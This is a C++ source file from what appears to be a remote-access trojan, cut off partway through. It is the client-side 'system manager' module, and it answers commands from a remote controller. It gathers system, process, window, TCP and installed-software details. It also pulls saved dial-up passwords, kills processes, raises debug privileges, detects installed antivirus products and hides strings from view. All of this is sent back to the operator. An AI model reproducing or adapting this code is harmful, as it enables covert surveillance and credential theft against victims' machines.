// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "SystemManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")
#include "../until.h"

typedef struct 
{
	BYTE bToken;		   // = 1	
	CHAR szCpuSpeend[32];  //cpu�ٶ� 
	CHAR szCpuInfo[128];   //CPU��Ϣ
	CHAR szPcName[50];     //���������
	CHAR szUserName[32];   //�û���
	CHAR szScrSize[32];    //��Ļ�ֱ���
	CHAR LineName[100];    //��������
	CHAR LinePort[32];     //���߶˿�
	CHAR Program[256];     //����;��
	CHAR InstallOpen[100]; //�������з�ʽ
	CHAR szUserVirus[256]; //�û�ɱ�����
	DWORD Memory;          //�ڴ�����
}MESSAGEInfo;
//////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_MEMOEY=100,     //��ȡCPU�ڴ�ֵ����
	COMMAND_STOPED,       //����ֹͣ����
	TOKEN_MEMORY          //����˷��͹����ڴ�ʹ��ֵ
};

#define SystemBasicInformation       0
#define SystemPerformanceInformation 2
#define SystemTimeInformation        3
#define Li2Double(x) ((double)((x).HighPart) * 4.294967296E9 + (double)((x).LowPart))
typedef struct{
	DWORD   dwUnknown1;
	ULONG   uKeMaximumIncrement;
	ULONG   uPageSize;
	ULONG   uMmNumberOfPhysicalPages;
	ULONG   uMmLowestPhysicalPage;
	ULONG   uMmHighestPhysicalPage;
	ULONG   uAllocationGranularity;
	PVOID   pLowestUserAddress;
	PVOID   pMmHighestUserAddress;
	ULONG   uKeActiveProcessors;
	BYTE    bKeNumberProcessors;
	BYTE    bUnknown2;
	WORD    wUnknown3;
}SYSTEM_BASIC_INFORMATION;

typedef struct
{
	LARGE_INTEGER   liIdleTime;
	DWORD           dwSpare[76];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
	LARGE_INTEGER liKeBootTime;
	LARGE_INTEGER liKeSystemTime;
	LARGE_INTEGER liEXPTimeZoneBias;
	ULONG         uCurrentTimeZoneId;
	DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;
typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
PROCNTQSI NtQuerySystemInformation;

////////////////////////////////////////////////////////////////////////////////////////////
BOOL DebugPrivilege(const char *PName,BOOL bEnable);

CSystemManager::CSystemManager(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl) : CManager(pClient)
{
	NetPort = Ports;        //���Ӷ˿�
	NetLine = Linetypes;    //���ӷ�ʽ
	NetOpert = Opertypes;   //��������
	Linkaddress = Addressl; //���ӵ�ַ

	StopEvent=CreateEvent(NULL,false,false,NULL);
	SendProcessList();
}

CSystemManager::~CSystemManager()
{
//   	TerminateThread( hSendMemoryThread, 0);
//	CloseHandle(hSendMemoryThread);
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_SYSTEMINFO:
		GetSystemInfo();
		break;
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:   // ��������
		SendDialupassList();
		break;
	case COMMAND_TSLIST:
		SendTcpList();
		break;
	case COMMAND_KILLPROCESS:  //�رս���
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WINDOW_CLOSE:  //�򴰿ڷ��͹ر���Ϣ
		CloseWindow(lpBuffer+1);  
		break;
	case COMMAND_WINDOW_TEST:    //�����С�� ���ش���
		TestWindow(lpBuffer+1);   
		break;
	case COMMAND_MEMOEY:        //��ȡCPU�ڴ�ʹ�����
		hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
		break;
	case COMMAND_STOPED:
        SetEvent(StopEvent);
		 break;
	case COMMAND_rjLIST:
		SendSoftList();
		break;

	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	
}
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)  //�رճ���
{
	HANDLE hProcess = NULL;
	
	for (unsigned int i = 0; i < nSize; i += 4)
	{
		DWORD Ipsid = *(LPDWORD)(lpBuffer + i);
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_ALL_ACCESS,FALSE,Ipsid);
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}

	// ����Sleep�£���ֹ����
	Sleep(200);
	// ˢ�½����б�
	SendProcessList();
	// ˢ�´����б�
//	SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
   	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);     //��ȡȨ��
	//����ϵͳ����
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //��ʱ����һ�»�����
	
	lpBuffer[0] = TOKEN_PSLIST;       
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))       //�õ���һ������˳���ж�һ��ϵͳ�����Ƿ�ɹ�
	{	  
		do
		{      
			//�򿪽��̲����ؾ��
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				//ö�ٵ�һ��ģ����Ҳ��������
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//�õ��������������
				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//��ʼ����ռ�õĻ������� ���ǹ������ķ��͵����ݽṹ
				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				//���ݽṹ�� ����ID+������+0+����������+0
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
			CloseHandle(hProcess);//���޸�

		}
		while(Process32Next(hSnapshot, &pe32));      //�����õ���һ������
	}
	//��lpbuffer�����������ȥ 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //��ԭ��Ȩ
	CloseHandle(hSnapshot);       //�ͷž�� 
	return lpBuffer;	    //���ݷ���
}

BOOL DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);

	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
   if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	CloseHandle(hToken);
	return bResult;	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	try
	{



		GetWindowText(hwnd, strTitle, sizeof(strTitle)-1);
		strTitle[sizeof(strTitle)-1]=0;
		if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
			return true;
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;
		}
		dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}

/*
	memset(strTitle, 0, sizeof(strTitle));
	//�õ�ϵͳ���ݽ����Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(hwnd, strTitle, sizeof(strTitle));
	//�����ж� �����Ƿ�ɼ� �����Ϊ��
	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;
	//ͬ���̹���һ������ע�����ķ��͵����ض˵����ݽṹ
	
	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //��ʱ���仺���� 
	
	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);
	//���¼��㻺������С
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	//��������memcpy���ܿ������ݽṹΪ hwnd+���ڱ���+0
	memcpy((lpBuffer+dwOffset),&hwnd,sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	
	return true;
}

*/
LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}

//��ȡ�ڴ�ʹ�����
void SendCPUAndMemoryInfo(DWORD d,LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;
	
	char buf[12];
	ZeroMemory(buf,12);
	buf[0]=TOKEN_MEMORY;
	MEMORYSTATUS mem;
	::GlobalMemoryStatus(&mem);
	memcpy(buf+1,(void*)&mem.dwAvailPhys,sizeof(DWORD));   //�ڴ�
	
	memcpy(buf+1+sizeof(DWORD),(void*)&d,sizeof(DWORD));
	
	pThis->Send((unsigned char *)buf,12);
}

DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;
//	Sleep(3000);
	SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
	SYSTEM_TIME_INFORMATION        SysTimeInfo;
	SYSTEM_BASIC_INFORMATION       SysBaseInfo;
	double                         dbIdleTime;
	double                         dbSystemTime;
	LONG                           status;
	LARGE_INTEGER                  liOldIdleTime = {0,0};
	LARGE_INTEGER                  liOldSystemTime = {0,0};
	NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"),"NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
		return 0;
	// get number of processors in the system
	status = NtQuerySystemInformation(SystemBasicInformation,&SysBaseInfo,sizeof(SysBaseInfo),NULL);
	if (status != NO_ERROR)
		return 0;
	//printf(" CPU Usage (press any key to exit):    ");
	BYTE count=0;
	while(1)
	{
		// get new system time
		status = NtQuerySystemInformation(SystemTimeInformation,&SysTimeInfo,sizeof(SysTimeInfo),0);
		if (status!=NO_ERROR)
			return 0;
		// get new CPU's idle time
		status = NtQuerySystemInformation(SystemPerformanceInformation,&SysPerfInfo,sizeof(SysPerfInfo),NULL);
		if (status != NO_ERROR)
			return 0;
		// if it's a first call - skip it
		if (liOldIdleTime.QuadPart != 0) 
		{ 
			// CurrentValue = NewValue - OldValue 
			dbIdleTime = Li2Double(SysPerfInfo.liIdleTime) - Li2Double(liOldIdleTime); 
			dbSystemTime = Li2Double(SysTimeInfo.liKeSystemTime) -Li2Double(liOldSystemTime);
			
			// CurrentCpuIdle = IdleTime / SystemTime 
			dbIdleTime = dbIdleTime / dbSystemTime;
			// CurrentCpuUsage% = 100 - (CurrentCpuIdle * 100) / NumberOfProcessors 
			dbIdleTime = 100.0 - dbIdleTime * 100.0 /(double)SysBaseInfo.bKeNumberProcessors + 0.5;
			SendCPUAndMemoryInfo((unsigned long)dbIdleTime,lparam);
		}
		
		// store new CPU's idle and system time 
		liOldIdleTime = SysPerfInfo.liIdleTime; 
		liOldSystemTime = SysTimeInfo.liKeSystemTime;
		if (WaitForSingleObject(pThis->StopEvent,3000)==WAIT_OBJECT_0)
		{
			break;
		}
	} 
	pThis->m_pClient->Disconnect();

	return true;
}

///////////////////////////////////////////ɱ����ʾ////////////////////////////////////


typedef struct
{
	char *Course;
	char *Name;
}ANTIVIRUS;

ANTIVIRUS g_AntiVirus_Data[20] = 
{
	{"360tray.exe",    "360��ȫ��ʿ"},
	{"360sd.exe",      "360ɱ��"},
	{"avp.exe",        "����˹��"},
	{"KvMonXP.exe",    "����ɱ��"},
	{"RavMonD.exe",    "����ɱ��"},
	{"Mcshield.exe",   "�󿧷�"},
	{"egui.exe",       "NOD32"},
	{"kxetray.exe",    "��ɽ����"}, 
	{"knsdtray.exe",   "��ţɱ��"},
	{"TMBMSRV.exe",    "����ɱ��"},
	{"avcenter.exe",   "Avira(С��ɡ)"},
	{"ashDisp.exe",    "Avast���簲ȫ"}, 
	{"rtvscan.exe",    "ŵ��ɱ��"}, 
	{"ksafe.exe",      "��ɽ��ʿ"}, 
	{"QQPCRTP.exe",    "QQ���Թܼ�"},
	{"  ",    "  "}

};

char* GetViru()
{	
	static char AllName[1024];
	int t=0;
	memset(AllName, 0, sizeof(AllName));
	while(1)
	{
		if (strstr(g_AntiVirus_Data[t].Course, " " )  == 0 )
		{	
			if (GetProcessID(g_AntiVirus_Data[t].Course)) 
			{
				lstrcat( AllName, g_AntiVirus_Data[t].Name);
				lstrcat( AllName, " " );
			}
		}
		else
			break;
		t++;
	}

	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , "δ���� ");
	}

	return AllName;
}



//=========================================================
BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
{
    if(!lpName)
	{
        return FALSE;
	}
    HANDLE         hProcessSnap = NULL; 
    BOOL           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) 
        return (FALSE); 

    pe32.dwSize = sizeof(PROCESSENTRY32); 
    if (Process32First(hProcessSnap, &pe32)) 
    {
        do 
        {
			_strupr(pe32.szExeFile);
			if(!strcmp(pe32.szExeFile,lpName))
			{
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken);
                CloseHandle (hProcessSnap); 
                return (bRet);
			}
        } 
        while (Process32Next(hProcessSnap, &pe32)); 
        bRet = TRUE; 
    } 
    else 
        bRet = FALSE;

    CloseHandle (hProcessSnap); 
    return (bRet);
}

//=================��õ�ǰ��½�û��������������====================
BOOL GetCurrentUserName(char szUser[],char szDomain[])
{
    HANDLE hToken;

    //�õ�shell��token
    if(!GetTokenByName(hToken,"EXPLORER.EXE"))
	{
        return FALSE;
	}
    DWORD        cbti     = 0;
    PTOKEN_USER  ptiUser  = NULL;
    SID_NAME_USE snu;

    //ȡ������ռ��С
    if (GetTokenInformation(hToken, TokenUser, NULL, 0, &cbti)) 
	{
        CloseHandle(hToken);
        return FALSE;
	}

    //����ռ�
    ptiUser = (PTOKEN_USER) HeapAlloc(GetProcessHeap(), 0, cbti);

    if(!ptiUser)
	{
        CloseHandle(hToken);
        return FALSE;
	}

    //ȡ��token��Ϣ
    if (!GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti))
	{
        CloseHandle(hToken);
        HeapFree(GetProcessHeap(), 0, ptiUser);
        return FALSE;
	}

    DWORD nUser = 50;
    DWORD nDomain = 50;

    //�����û���sid�õ��û�����domain
    if (!LookupAccountSid(NULL, ptiUser->User.Sid, szUser, &nUser, szDomain, &nDomain, &snu))
	{
        CloseHandle(hToken);
        HeapFree(GetProcessHeap(), 0, ptiUser);
        return FALSE;
	}

    CloseHandle(hToken);
    HeapFree(GetProcessHeap(), 0, ptiUser);

    return TRUE;
}
void GetCurrentUserNamet(char szUser[])
{
	char TszUser[50]={0};
	char TszDomain[50]={0};
	if(GetCurrentUserName(TszUser,TszDomain))
	{
		wsprintf(szUser,"%s",TszUser);
	}
	else
	{
		wsprintf(szUser,"%s","���û���½״̬��");
	}
}

void CSystemManager::NetSystem(UINT Port)
{

	NetPort = Port;     //���Ӷ˿�
}

extern char* MyDecode(char *str);
void CSystemManager::GetSystemInfo()
{
	MESSAGEInfo Infomsg;
	//��ȡ����ϵͳ�����Ϣ
	Infomsg.bToken = TOKEN_SYSTEMINFO; 
	//////////////CPU Speed/////////////////
	DWORD dwCpu, dwBufLen;
	HKEY hKey;
	char JYvni02[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	RegOpenKeyEx( HKEY_LOCAL_MACHINE,
		JYvni02,
		0, KEY_QUERY_VALUE, &hKey );
	dwBufLen = sizeof(DWORD);
	RegQueryValueEx( hKey, ("~MHz"), NULL, NULL,(LPBYTE)&dwCpu, &dwBufLen);
	RegCloseKey(hKey);
	wsprintf(Infomsg.szCpuSpeend,("~%u MHz"), dwCpu);
	//Get CPU Info===============================
	CHAR SubKey[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0','\0'};
	hKey = NULL;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize = 128 * sizeof(TCHAR);
		char  ValueSz[MAX_PATH]={0};
		if(RegQueryValueEx(hKey,("ProcessorNameString"),NULL,&dwType,(BYTE *)ValueSz,&dwSize) == ERROR_SUCCESS)
		    strcpy(Infomsg.szCpuInfo,DelSpace(ValueSz));
		RegCloseKey(hKey);
	}


	//Get Computer & User Name========================
	DWORD dwLen = sizeof(Infomsg.szPcName);
	GetComputerNameA(Infomsg.szPcName, &dwLen);

	//��ȡ��ǰ�û��������������
	GetCurrentUserNamet(Infomsg.szUserName);

	//Get Screen Size=================================
	
//////////////////////////////////////////////////


	wsprintf(Infomsg.szScrSize, ("%d * %d"), GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));

// 	if(NetLine==0)
// 	    wsprintf(Infomsg.LineName,"����IP���ߣ�%s",Linkaddress);  //��������д��
// 	if(NetLine==1)
// 	    wsprintf(Infomsg.LineName,"QQ�ռ����ߣ�%s",Linkaddress);  //QQ����д��
// 	if(NetLine==2)
// 	    wsprintf(Infomsg.LineName,"�������ߣ�%s",Linkaddress);    //��������д��
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
    lpszHost = Linkaddress;
	dwPort = NetPort;
	char	Linkaddress[MAX_PATH]={0};
	char	strTMPTime[MAX_PATH]={0};
	char	strTMPHostB[MAX_PATH]={0};
//	wsprintf(strTMPHostA, "%s","��������");
	wsprintf(Infomsg.LineName,"����IP���ߣ�%s",lpszHost);  //��������д��

	wsprintf(Infomsg.LinePort,"%d",NetPort);     //���߶˿�д��

	char szbuf[256];
	GetModuleFileName(NULL,szbuf,MAX_PATH);   //���ڻ�ȡ������·��

	wsprintf(Infomsg.Program,"%s",szbuf );   

	if(NetOpert==0)  //��ɫһ��������
	{
	    wsprintf(Infomsg.InstallOpen,"%s","(��ɫ����ģʽ)--����������!");     //�������з�ʽ
	}
	else if(NetOpert==1)  // ������������
	{
		wsprintf(Infomsg.InstallOpen,"%s","(��������ģʽ)--SYSTEM�û�����!");     //�������з�ʽ
	}
	else if(NetOpert==2)  // ֱ����������
	{
		wsprintf(Infomsg.InstallOpen,"%s","(Run����ģʽ)--��ǰ�û�����!");      //�������з�ʽ
	}


	wsprintf(Infomsg.szUserVirus,"%s",GetViru());   //ɱ�����

	//�ڴ��С
    MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	Infomsg.Memory = (unsigned long)MemInfo.ullTotalPhys/1024/1024;

	Send((LPBYTE)&Infomsg, sizeof(MESSAGEInfo));
}

void CSystemManager::CloseWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd,buf,sizeof(DWORD));      //�õ����ھ�� 
	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //�򴰿ڷ��͹ر���Ϣ

	Sleep(200);
	SendWindowsList();  //������ʾˢ��
}

void CSystemManager::TestWindow(LPBYTE buf)
{
   	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd,buf,sizeof(DWORD));      //�õ����ھ��
	memcpy(&dHow,buf+sizeof(DWORD),sizeof(DWORD));     //�õ����ڴ������
	ShowWindow((HWND__ *)hwnd,dHow);
}
bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	typedef BOOL (WINAPI *GetLastErrorT)
		(
		VOID
		);
	char FhTZBW[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError = (GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FhTZBW);
	
	
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValueA(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (pGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}
void CSystemManager::SendTcpList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getTcpList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
	
}

//TCP �˿�״̬.
static char TcpState[][32] = 
{
	"???",
		"CLOSED",
		"LISTEN",
		"SYN_SENT",
		"SYN_RCVD",
		"ESTABLISHED",
		"FIN_WAIT1",
		"FIN_WAIT2",
		"ITMED_WAIT",
		"CLOSING",
		"LAST_ACK",
		"TIME_WAIT",
		"DELETE_TCB"
};

// ����IP��ַ�ַ���.
PCHAR GetIP(unsigned int ipaddr)
{
	static char pIP[20];
	unsigned int nipaddr = htonl(ipaddr);
	wsprintf(pIP, "%d.%d.%d.%d",
		(nipaddr >>24) &0xFF,
		(nipaddr>>16) &0xFF,
		(nipaddr>>8) &0xFF,
		(nipaddr)&0xFF);
	return pIP;
}



LPBYTE CSystemManager::getTcpList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	
	char    cLocalAddr[MAX_PATH] = {0};
	char    cLocalPort[MAX_PATH] = {0};
	char    cRemoteAddr[MAX_PATH] = {0};
	char    cRemotePort[MAX_PATH] = {0};
	char    cState[MAX_PATH] = {0};
	DWORD   dwState;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 10240);
	lpBuffer[0] = TOKEN_TSLIST;
	dwOffset = 1;
	
	DWORD dwSize = 10240;
	BYTE pData[10240]; // �������ݻ������һ�������СΪ10240�ֽ�
	MIB_TCPTABLE *pTCPTable = (MIB_TCPTABLE*)pData;
	memset(pData,0,dwSize);
	// ��ȡTCP�б���Ϣ
	GetTcpTable(pTCPTable,&dwSize,TRUE);
	
	// ��ȡTCP�б�����
	for (DWORD i = 0; i < pTCPTable->dwNumEntries; i++)
	{
		wsprintf(cLocalAddr, "%s",GetIP(pTCPTable->table[i].dwLocalAddr));         // ����IP��ַ
		wsprintf(cLocalPort, "%d",htons((WORD)pTCPTable->table[i].dwLocalPort));   // ���ض˿�
		wsprintf(cRemoteAddr, "%s",GetIP(pTCPTable->table[i].dwRemoteAddr));       // Զ��IP��ַ
		wsprintf(cRemotePort, "%d",htons((WORD)pTCPTable->table[i].dwRemotePort)); // Զ�̶˿�
		dwState =  pTCPTable->table[i].dwState;                                    // ����״̬
		if (dwState < 13)
		{
			wsprintf(cState,"%s",TcpState[dwState]); 
		}
		
		dwLength = lstrlen(cLocalAddr) + lstrlen(cLocalPort) + lstrlen(cRemoteAddr) + lstrlen(cRemotePort)+ lstrlen(cState) + 5;
		
		// ������̫С�������·�����
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
		
		memcpy(lpBuffer + dwOffset, cLocalAddr, lstrlen(cLocalAddr) + 1);
		dwOffset += lstrlen(cLocalAddr) + 1;
		
		memcpy(lpBuffer + dwOffset, cLocalPort, lstrlen(cLocalPort) + 1);
		dwOffset += lstrlen(cLocalPort) + 1;
		
		memcpy(lpBuffer + dwOffset, cRemoteAddr, lstrlen(cRemoteAddr) + 1);
		dwOffset += lstrlen(cRemoteAddr) + 1;
		
		memcpy(lpBuffer + dwOffset, cRemotePort, lstrlen(cRemotePort) + 1);
		dwOffset += lstrlen(cRemotePort) + 1;
		
		memcpy(lpBuffer + dwOffset, cState, lstrlen(cState) + 1);
		dwOffset += lstrlen(cState) + 1;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpBuffer;	
}
void CSystemManager::SendSoftList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getSoftList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
	
}
LPBYTE CSystemManager::getSoftList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_rjLIST;
	dwOffset = 1;
	
	char  szSubKey[MAX_PATH] = ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
	HKEY hKey,hSubKey;
	LONG lRetVal,lRetVal2;
	DWORD nIndex = 0;
	DWORD nNameLen            = MAX_PATH;  // ����������
	DWORD nDisplayLen         = MAX_PATH;  // ��ʾ����
